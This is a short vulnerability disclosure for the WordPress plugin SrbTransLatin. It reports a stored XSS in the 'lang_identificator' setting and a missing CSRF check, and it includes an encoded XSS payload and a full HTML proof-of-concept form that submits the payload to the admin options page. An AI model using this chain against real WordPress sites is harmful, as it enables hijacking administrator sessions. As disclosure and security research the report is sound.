Well ,sir ,I just found a Stored-XSS bug and a CSRF bug at wp-plugin SrbTransLatin.

#### Stored-XSS

When the admin user click the "Update Options" button in the SrbTransLatin setting page, we'll post some data to:

```
http://localhost/wordpress/wp-admin/options-general.php?page=srbtranslatoptions
```


But when I pentest the  parameter in this plugin, I found when I write something into this point, it does not filter well.

Weak data parameter:

```
lang_identificator=script%27%22%3E%3Csvg%2Fonload%3Dalert%28123%29%3E%3C%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/SrbTransLatin/insert-xss.png)


#### CSRF

Well, the stored-xss here need to combined with a csrf bug. Because no csrf protection here, we can cheat the admin user to visit the evil html on the evil site.

POC:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/wordpress/wp-admin/options-general.php?page=srbtranslatoptions" method="POST">
      <input type="hidden" name="lang&#95;identificator" value="script&apos;&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;123&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="stl&#95;default&#95;language" value="cir" />
      <input type="hidden" name="file&#95;lang&#95;delimiter" value="&#61;" />
      <input type="hidden" name="sanitize&#95;file&#95;names" value="on" />
      <input type="hidden" name="Submit" value="Update&#32;Options" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

In a word, if the manager could be cheated to visit my evil html on my site, I can get the manager's cookie easily, or do something more evilly.


Well,  by the way, I just test the bug in the wordpress 4.9.1 and the latest version of the wp-plugin SrbTransLatin.